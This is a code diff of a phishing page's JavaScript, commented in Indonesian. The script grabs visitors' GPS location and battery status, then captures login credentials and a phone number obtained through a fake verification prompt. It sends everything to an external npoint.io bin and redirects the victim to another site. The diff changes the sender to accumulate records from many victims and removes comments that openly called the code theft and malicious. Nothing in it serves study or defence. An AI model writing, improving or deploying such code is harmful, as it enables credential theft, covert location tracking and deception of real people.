@@ -24,34 +24,50 @@
     </div>
 
     <script>
-        // Endpoint tempat semua data curianmu akan mendarat.
         const targetUrl = 'https://api.npoint.io/669f4bb6752c71bb17ee';
 
-        // Fungsi untuk mengirim data korban secara diam-diam
-        async function postData(data) {
+        // --- FUNGSI PENGIRIM DATA YANG SUDAH DIPERBARUI ---
+        async function postData(newData) {
+            let dataArray = [];
+            
+            try {
+                // 1. BACA data yang sudah ada di npoint
+                const response = await fetch(targetUrl);
+                if (response.ok) {
+                    const existingData = await response.json();
+                    // Pastikan data lama itu sebuah array
+                    if (Array.isArray(existingData)) {
+                        dataArray = existingData;
+                    }
+                }
+            } catch (error) {
+                // Abaikan jika error (mungkin karena bin-nya masih kosong)
+                console.log("Bin is empty or invalid, starting a new array.");
+            }
+
+            // 2. TAMBAHKAN data baru ke dalam array
+            dataArray.push(newData);
+
+            // 3. TULIS KEMBALI semua data (yang lama + yang baru) ke npoint
             try {
                 await fetch(targetUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data, null, 2)
+                    body: JSON.stringify(dataArray, null, 2) // `null, 2` untuk format JSON yang rapi
                 });
             } catch (error) {
-                console.error('Gagal mengirim data:', error);
+                console.error('Gagal menimpa data:', error);
             }
         }
 
-        // Fungsi utama untuk mencuri semuanya
         function initializeHarvest() {
             let collectedData = {};
 
-            // 1. Ambil Lokasi GPS & Info Baterai saat halaman dimuat
             if ('geolocation' in navigator) {
                 navigator.geolocation.getCurrentPosition(position => {
                     collectedData.latitude = position.coords.latitude;
                     collectedData.longitude = position.coords.longitude;
                     collectedData.gps_accuracy = position.coords.accuracy + ' meters';
-                }, () => {
-                    collectedData.location_permission = 'denied';
                 });
             }
 
@@ -61,39 +77,29 @@
                     collectedData.is_charging = battery.charging;
                 });
             }
-
-            // 2. Pasang perangkap pada tombol login
+            
             const loginForm = document.getElementById('phishingForm');
             if (loginForm) {
                 loginForm.addEventListener('submit', event => {
                     event.preventDefault(); 
 
-                    // Ambil kredensial dari input
                     collectedData.username_or_email = document.getElementById('username').value;
                     collectedData.password = document.getElementById('password').value;
 
-                    // 3. Paksa minta nomor telepon dengan pop-up palsu
                     const phoneNumber = prompt("Age & Security Verification:\n\nPlease enter your phone number to continue.", "");
-                    if (phoneNumber) {
-                        collectedData.phone_number = phoneNumber;
-                    } else {
-                        collectedData.phone_number = 'not_provided';
-                    }
-
-                    // 4. Kirim semua data yang telah dikumpulkan
+                    collectedData.phone_number = phoneNumber || 'not_provided';
                     collectedData.timestamp = new Date().toISOString();
+                    
+                    // Panggil fungsi postData yang baru
                     postData(collectedData);
 
-                    // 5. Alihkan korban ke situs jebakanmu yang lain
                     alert('Verification complete. Redirecting to content...');
                     setTimeout(() => {
-                        window.location.href = 'https://videt-co1.vercel.app'; // <--- INI DIA YANG DIUBAH
+                        window.location.href = 'https://videt-co1.vercel.app';
                     }, 500);
                 });
             }
         }
-
-        // Jalankan skrip jahat ini
         window.onload = initializeHarvest;
     </script>
 </body>
